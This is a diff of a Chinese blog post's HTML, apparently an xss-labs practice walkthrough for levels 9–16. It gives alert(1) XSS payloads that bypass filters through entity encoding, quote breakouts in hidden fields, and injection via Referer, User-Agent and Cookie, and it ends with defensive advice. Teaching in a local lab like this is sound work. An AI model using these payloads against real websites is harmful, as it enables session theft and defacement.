+<p>HTML 实体有两种写法，第一种是之前提到的 <code>&amp;entity_name;</code> 形式，比如 <code>$lt;</code> 表示小于号；第二种是 <code>&amp;#entity_number;</code> 形式，其中 entity_number 是字符的实体编号，比如 <code>&amp;#60;</code> 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。可以使用<a href="https://mothereff.in/html-entities">这个工具</a>来转换。</p>
+<p>对于这题，为了绕过 <code>javascript</code> 这个词的屏蔽，我们将 i 写为其字符实体 <code>&amp;#x69;</code> 即可。</p>
+<pre><code>javascr&amp;#x69;pt:alert(1)
+</code></pre>
+<h3><a id="level-9单纯的必须包含" class="heading-anchor"></a>Level 9：单纯的「必须包含」</h3>
+<p>如果使用上一题的 payload，会提示链接不合法。如果使用一个合法的链接，比如 <code>http://test</code>，则可以成功添加。</p>
+<p>仅过尝试可以发现，后端只检测传入的链接字符串是否包含 <code>http://</code>，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 <code>http://</code> 就行了。</p>
+<pre><code>javascr&amp;#x69;pt:alert(1)//http://
+</code></pre>
+<h2><a id="字段注入" class="heading-anchor"></a>字段注入</h2>
+<p>下面这四关和 level 2 差不多，区别只在于能够注入的字段不同。Level 2 中我们在 input 标签的 value 中注入，而下面几关分别在不同的注入点进行注入。</p>
+<h3><a id="level-10隐藏表单字段注入" class="heading-anchor"></a>Level 10：隐藏表单字段注入</h3>
+<p>这关乍一看似乎并没有可用的注入点。其实查看源码可以看到这个隐藏的表单：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和well done!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre>
+<p>我们尝试请求的时候给出 <code>t_link</code>、<code>t_history</code> 和 <code>t_sort</code> 几个参数，发现 <code>t_sort</code> 的 value 字段对应其参数。举例来说，尝试这个 payload：</p>
+<pre><code>?keyword=test?t_link=tlink&amp;t_history=thist&amp;t_sort=tsort
+</code></pre>
+<p>看到 HTML 的对应部分变成了这样：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和test?t_link=tlink相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;tsort&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre>
+<p>看来可以用 <code>t_sort</code> 的 value 这个字段来注入。</p>
+<p>仅过尝试，对这个参数的处理上过滤了 <code>&lt;&gt;</code>，没有过滤双引号。所以我们可以直接闭合双引号，添加 <code>onmouseover</code> 属性来达到我们的目的。</p>
+<p>但是依然有一个问题：这个元素是 hidden 的，意味着不会显示出来，不管是 focus 还是 mouseover 都不能触发。隐藏的状态是由最后的 <code>type=&quot;hidden&quot;</code> 设置的，那我们在其之前加入一个空的 <code>type</code> 就可以覆盖掉后面的设置。也就是说，注入之后的 input 会变成这样：</p>
+<pre><code>&lt;input name=&quot;t_sort&quot; value=&quot;&quot; onmouseover=javascript:alert(1) type &quot;&quot; type=&quot;hidden&quot;&gt;
+</code></pre>
+<p>Payload 如下；</p>
+<pre><code>?keyword=test&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;
+</code></pre>
+<h3><a id="level-11referer-注入" class="heading-anchor"></a>Level 11：Referer 注入</h3>
+<p>如果是完成了前面一关跳转过来的，可以看到源码里的 <code>t_ref</code> 字段是跳转来的 URL（也就是请求的 Referer）：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span>
 ...
-&lt;input name=&quot;t_ref&quot;  value=&quot;http://localhost/xss-labs/level10.php?keyword=test&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;</code></pre><p>只要存在可以自定义的字段，我们就可以注入。一种方法是创建一个文件名为 <code>&quot; onmouseover=javascript:alert(1) type &quot;.html</code> 的 HTML 文件，在其中重定向到 level 11 的页面。<br>更简洁的做法是直接修改请求的 Referer 字段。</p><p>关于 Referer，推荐阅读：[HTTP Referer 教程 - 阮一峰的网络日志<br>](<a href="https://www.ruanyifeng.com/blog/2019/06/http-referer.html">https://www.ruanyifeng.com/blog/2019/06/http-referer.html</a>)。</p><h3>Level 12：UA 注入</h3><p>和前面的类似，查看源码可以看到有一个字段 value 被设置成了浏览器 UA。</p><p>浏览器 UA 是完全可以自定义的，随便下载一个自定义 UA 的浏览器插件，在里面将 UA 设置为 payload，然后直接访问 level 12 即可。</p><pre><code>&quot; onmouseover=javascript:alert(1) type &quot;</code></pre><h3>Level 13：Cookie 注入</h3><p>和 level 12 一样，有一个字段 value 设为了一个 Cookie。</p><p>直接打开浏览器 F12 工具，找到这个对应的名为 <code>user</code> 的 Cookie，设置为 payload，然后刷新网站即可。</p><pre><code>&quot; onmouseover=javascript:alert(1) type &quot;</code></pre><p>Level 14 嵌入了一个网站，这个网站已经打不开了。似乎是个查看图片 exif 信息的网站，猜测可能可以将 payload 写在 exif 信息里进行注入吧。</p><h3>Level 16：空格过滤</h3><p>这题似乎也是过滤，使用了综合的过滤规则。经过一番探究，<code>script</code> 和 <code>/</code> 都会被替换为 <code>&amp;nbsp;</code>，每个空格也都会被换成 <code>&amp;nbsp;</code>，这正是本题最麻烦之处。</p><p>HTML 中，有什么字符可以代替空格呢？答案是换行符（<code>%0A</code>）。</p><pre><code>?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</code></pre><h2>Special</h2><h3>Level 15：Angular <code>ng-include</code></h3><p>在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 <code>&lt;script&gt;</code> 标签内的代码。（有一点安全意识，但不多……）</p><p>一种方法是写一个能够弹窗的简单 HTML，然后 include 进来，比如：</p><pre><code class="lang-html">&lt;html&gt;
-&lt;h1&gt;Hacked&lt;/h1&gt;
-&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;&lt;/img&gt;
-&lt;/html&gt;</code></pre><p>假设放在网站根目录，payload 就是：</p><pre><code>?src=&quot;/alert.html&quot;</code></pre><p>Level 17 到 Level 20 都是 Flash 的利用，现在 Flash 已经退出历史舞台了，所以这几关已经失去意义。</p><h2>总结</h2><p>XSS 攻击历久弥新，目前 XSS 漏洞依然广泛存在。其核心在于找到注入点并通过 payload 让浏览器执行 js 代码。</p><p>注入点不仅可以来源于用户提供的文本（请求参数或后端存储的字段），也可以是 Referer、UA、Cookie 等。</p><p>执行 js 代码一般有四种方式，在使用时可以根据条件灵活选择：</p><ul><li>通过 <code>&lt;script&gt;</code> 标签。</li><li>通过元素的 onmouseover 属性。</li><li>通过 <code>&lt;img&gt;</code> 的 onerror 属性，如 <code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code>。</li><li>通过 URI，如 <code>javascript:alert(1)</code>。</li></ul><p>一般来说，使用 PHP 的 <code>htmlspecialchars()</code> 函数能够防御很大一部分 XSS（注意过滤单引号）。许多字符过滤上的漏洞都是没有使用 <code>htmlspecialchars()</code> 而使用自己编写的字符过滤函数引起。</p> </article> <hr class="my-8" data-astro-cid-4sn4zg3r> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var b=Object.defineProperty;var f=(c,o,i)=>o in c?b(c,o,{enumerable:!0,configurable:!0,writable:!0,value:i}):c[o]=i;var l=(c,o,i)=>(f(c,typeof o!="symbol"?o+"":o,i),i);var p;{let c={0:t=>m(t),1:t=>i(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(i(t)),5:t=>new Set(i(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},o=t=>{let[e,r]=t;return e in c?c[e](r):void 0},i=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([e,r])=>[e,o(r)]));customElements.get("astro-island")||customElements.define("astro-island",(p=class extends HTMLElement{constructor(){super(...arguments);l(this,"Component");l(this,"hydrator");l(this,"hydrate",async()=>{var d;if(!this.hydrator||!this.isConnected)return;let e=(d=this.parentElement)==null?void 0:d.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let r=this.querySelectorAll("astro-slot"),a={},h=this.querySelectorAll("template[data-astro-template]");for(let n of h){let s=n.closest(this.tagName);s!=null&&s.isSameNode(this)&&(a[n.getAttribute("data-astro-template")||"default"]=n.innerHTML,n.remove())}for(let n of r){let s=n.closest(this.tagName);s!=null&&s.isSameNode(this)&&(a[n.getAttribute("name")||"default"]=n.innerHTML)}let u;try{u=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(n){let s=this.getAttribute("component-url")||"<unknown>",y=this.getAttribute("component-export");throw y&&(s+=` (export ${y})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),n),n}await this.hydrator(this)(this.Component,u,a,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});l(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),r.disconnect(),this.childrenConnectedCallback()},r=new MutationObserver(()=>{var a;((a=this.lastChild)==null?void 0:a.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});r.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}start(){let e=JSON.parse(this.getAttribute("opts")),r=this.getAttribute("client");if(Astro[r]===void 0){window.addEventListener(`astro:${r}`,()=>this.start(),{once:!0});return}Astro[r](async()=>{let a=this.getAttribute("renderer-url"),[h,{default:u}]=await Promise.all([import(this.getAttribute("component-url")),a?import(a):()=>()=>{}]),d=this.getAttribute("component-export")||"default";if(!d.includes("."))this.Component=h[d];else{this.Component=h;for(let n of d.split("."))this.Component=this.Component[n]}return this.hydrator=u,this.hydrate},e,this)}attributeChangedCallback(){this.hydrate()}},l(p,"observedAttributes",["props"]),p))}})();</script><astro-island uid="2sCeaa" prefix="r0" component-url="/_astro/Comments.Ix56OY2D.js" component-export="default" renderer-url="/_astro/client.Th_ss2k4.js" props="{&quot;slug&quot;:[0,&quot;xss-labs-tutorial&quot;],&quot;permalink&quot;:[0,&quot;https://blog.skywt.cn/posts/xss-labs-tutorial&quot;],&quot;data-astro-cid-4sn4zg3r&quot;:[0,true]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;Comments&quot;,&quot;value&quot;:true}" await-children=""><h2><i class="ri-discuss-line"></i> 暂无评论</h2><hr class="my-8"/><h2><i class="ri-discuss-line"></i> 发表新的评论</h2><p class="mt-4 primary-color card p-2"><i class="ri-information-line"></i> <b>所有评论都将经过博主审核。</b>请勿填写无意义邮箱或发表无关评论、广告等，否则会被视为垃圾评论。<br/>评论提交组件是最近刚写的，如果遇到 bug 欢迎向博主反馈～</p><form class="mt-4 grid gap-4 grid-cols-1 sm:grid-cols-3 relative"><input placeholder="你的名字" type="text" required="" value=""/><input placeholder="邮箱" type="email" required="" value=""/><input placeholder="网址" type="url" value=""/><textarea rows="8" class="sm:col-span-3" placeholder="说点什么吧……" required=""></textarea><button type="submit" class="sm:col-span-3">提交</button></form><p class="mt-4 secondary-color text-sm leading-normal">提交评论即表明你同意本网站使用 Cookie，并允许本站在后台记录你的邮箱、IP 地址等必要信息。<br/>（提交一次评论后，本提示将不再展示）</p><!--astro:end--></astro-island> </section> </main>  <footer class="mt-16 py-8 bg-gray-100 dark:bg-neutral-900"> <div class="wide-container secondary-color text-sm"> <div class="flex justify-between flex-wrap"> <div class="m-2"> <a href="/" class="link">SkyWT</a> <span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ref&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://localhost/xss-labs/level10.php?keyword=test&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre>
+<p>只要存在可以自定义的字段，我们就可以注入。一种方法是创建一个文件名为 <code>&quot; onmouseover=javascript:alert(1) type &quot;.html</code> 的 HTML 文件，在其中重定向到 level 11 的页面。<br>
+更简洁的做法是直接修改请求的 Referer 字段。</p>
+<p>关于 Referer，推荐阅读：<a href="https://www.ruanyifeng.com/blog/2019/06/http-referer.html">HTTP Referer 教程 - 阮一峰的网络日志<br>
+</a>。</p>
+<h3><a id="level-12ua-注入" class="heading-anchor"></a>Level 12：UA 注入</h3>
+<p>和前面的类似，查看源码可以看到有一个字段 value 被设置成了浏览器 UA。</p>
+<p>浏览器 UA 是完全可以自定义的，随便下载一个自定义 UA 的浏览器插件，在里面将 UA 设置为 payload，然后直接访问 level 12 即可。</p>
+<pre><code>&quot; onmouseover=javascript:alert(1) type &quot;
+</code></pre>
+<h3><a id="level-13cookie-注入" class="heading-anchor"></a>Level 13：Cookie 注入</h3>
+<p>和 level 12 一样，有一个字段 value 设为了一个 Cookie。</p>
+<p>直接打开浏览器 F12 工具，找到这个对应的名为 <code>user</code> 的 Cookie，设置为 payload，然后刷新网站即可。</p>
+<pre><code>&quot; onmouseover=javascript:alert(1) type &quot;
+</code></pre>
+<p>Level 14 嵌入了一个网站，这个网站已经打不开了。似乎是个查看图片 exif 信息的网站，猜测可能可以将 payload 写在 exif 信息里进行注入吧。</p>
+<h3><a id="level-16空格过滤" class="heading-anchor"></a>Level 16：空格过滤</h3>
+<p>这题似乎也是过滤，使用了综合的过滤规则。经过一番探究，<code>script</code> 和 <code>/</code> 都会被替换为 <code>&amp;nbsp;</code>，每个空格也都会被换成 <code>&amp;nbsp;</code>，这正是本题最麻烦之处。</p>
+<p>HTML 中，有什么字符可以代替空格呢？答案是换行符（<code>%0A</code>）。</p>
+<pre><code>?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;
+</code></pre>
+<h2><a id="special" class="heading-anchor"></a>Special</h2>
+<h3><a id="level-15angular-ng-include" class="heading-anchor"></a>Level 15：Angular <code>ng-include</code></h3>
+<p>在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 <code>&lt;script&gt;</code> 标签内的代码。（有一点安全意识，但不多……）</p>
+<p>一种方法是写一个能够弹窗的简单 HTML，然后 include 进来，比如：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hacked<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>假设放在网站根目录，payload 就是：</p>
+<pre><code>?src=&quot;/alert.html&quot;
+</code></pre>
+<p>Level 17 到 Level 20 都是 Flash 的利用，现在 Flash 已经退出历史舞台了，所以这几关已经失去意义。</p>
+<h2><a id="总结" class="heading-anchor"></a>总结</h2>
+<p>XSS 攻击历久弥新，目前 XSS 漏洞依然广泛存在。其核心在于找到注入点并通过 payload 让浏览器执行 js 代码。</p>
+<p>注入点不仅可以来源于用户提供的文本（请求参数或后端存储的字段），也可以是 Referer、UA、Cookie 等。</p>
+<p>执行 js 代码一般有四种方式，在使用时可以根据条件灵活选择：</p>
+<ul>
+<li>通过 <code>&lt;script&gt;</code> 标签。</li>
+<li>通过元素的 onmouseover 属性。</li>
+<li>通过 <code>&lt;img&gt;</code> 的 onerror 属性，如 <code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code>。</li>
+<li>通过 URI，如 <code>javascript:alert(1)</code>。</li>
+</ul>
+<p>一般来说，使用 PHP 的 <code>htmlspecialchars()</code> 函数能够防御很大一部分 XSS（注意过滤单引号）。许多字符过滤上的漏洞都是没有使用 <code>htmlspecialchars()</code> 而使用自己编写的字符过滤函数引起。</p>
+ </article> <hr class="my-8" data-astro-cid-4sn4zg3r> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var b=Object.defineProperty;var f=(c,o,i)=>o in c?b(c,o,{enumerable:!0,configurable:!0,writable:!0,value:i}):c[o]=i;var l=(c,o,i)=>(f(c,typeof o!="symbol"?o+"":o,i),i);var p;{let c={0:t=>m(t),1:t=>i(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(i(t)),5:t=>new Set(i(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},o=t=>{let[e,r]=t;return e in c?c[e](r):void 0},i=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([e,r])=>[e,o(r)]));customElements.get("astro-island")||customElements.define("astro-island",(p=class extends HTMLElement{constructor(){super(...arguments);l(this,"Component");l(this,"hydrator");l(this,"hydrate",async()=>{var d;if(!this.hydrator||!this.isConnected)return;let e=(d=this.parentElement)==null?void 0:d.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let r=this.querySelectorAll("astro-slot"),a={},h=this.querySelectorAll("template[data-astro-template]");for(let n of h){let s=n.closest(this.tagName);s!=null&&s.isSameNode(this)&&(a[n.getAttribute("data-astro-template")||"default"]=n.innerHTML,n.remove())}for(let n of r){let s=n.closest(this.tagName);s!=null&&s.isSameNode(this)&&(a[n.getAttribute("name")||"default"]=n.innerHTML)}let u;try{u=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(n){let s=this.getAttribute("component-url")||"<unknown>",y=this.getAttribute("component-export");throw y&&(s+=` (export ${y})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),n),n}await this.hydrator(this)(this.Component,u,a,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});l(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),r.disconnect(),this.childrenConnectedCallback()},r=new MutationObserver(()=>{var a;((a=this.lastChild)==null?void 0:a.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});r.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}start(){let e=JSON.parse(this.getAttribute("opts")),r=this.getAttribute("client");if(Astro[r]===void 0){window.addEventListener(`astro:${r}`,()=>this.start(),{once:!0});return}Astro[r](async()=>{let a=this.getAttribute("renderer-url"),[h,{default:u}]=await Promise.all([import(this.getAttribute("component-url")),a?import(a):()=>()=>{}]),d=this.getAttribute("component-export")||"default";if(!d.includes("."))this.Component=h[d];else{this.Component=h;for(let n of d.split("."))this.Component=this.Component[n]}return this.hydrator=u,this.hydrate},e,this)}attributeChangedCallback(){this.hydrate()}},l(p,"observedAttributes",["props"]),p))}})();</script><astro-island uid="Z1fulp7" prefix="r0" component-url="/_astro/Comments.DNe12sm4.js" component-export="default" renderer-url="/_astro/client.DbokQZWz.js" props="{&quot;slug&quot;:[0,&quot;xss-labs-tutorial&quot;],&quot;data-astro-cid-4sn4zg3r&quot;:[0,true]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;Comments&quot;,&quot;value&quot;:true}" await-children=""><h2><i class="ri-discuss-line"></i> 暂无评论</h2><hr class="my-8"/><h2><i class="ri-discuss-line"></i> 发表新的评论</h2><p class="mt-4 primary-color card p-2"><i class="ri-information-line"></i> <b>所有评论都将经过博主审核。</b>请勿填写无意义邮箱或发表无关评论、广告等，否则会被视为垃圾评论。<br/>评论提交组件是最近刚写的，如果遇到 bug 欢迎向博主反馈～</p><form class="mt-4 grid gap-4 grid-cols-1 sm:grid-cols-3 relative"><input placeholder="你的名字" type="text" required="" value=""/><input placeholder="邮箱" type="email" required="" value=""/><input placeholder="网址" type="url" value=""/><textarea rows="8" class="sm:col-span-3" placeholder="说点什么吧……" required=""></textarea><button type="submit" class="sm:col-span-3">提交</button></form><p class="mt-4 secondary-color text-sm leading-normal">提交评论即表明你同意本网站使用 Cookie，并允许本站在后台记录你的邮箱、IP 地址等必要信息。<br/>（提交一次评论后，本提示将不再展示）</p><!--astro:end--></astro-island> </section> </main>  <footer class="mt-16 py-8 bg-gray-100 dark:bg-neutral-900"> <div class="wide-container secondary-color text-sm"> <div class="flex justify-between flex-wrap"> <div class="m-2"> <a href="/" class="link">SkyWT</a> <span>
 /
 <a href="/blog" class="link"> 博客</a> </span><span>
 /
@@ -121,4 +305,4 @@ xss-labs 通关教程 </span> </div> <div class="m-2"> <ul data-astro-cid-tfcnbj
         >
           <img src="/upyun.png" class="h-6" />
         </a>
-        <span class="align-middle">提供 CDN 加速、云存储服务</span> --> </p> </div> </div> </footer> </body></html> 
+        <span class="align-middle">提供 CDN 加速、云存储服务</span> --> </p> </div> </div> </footer> </body></html>  
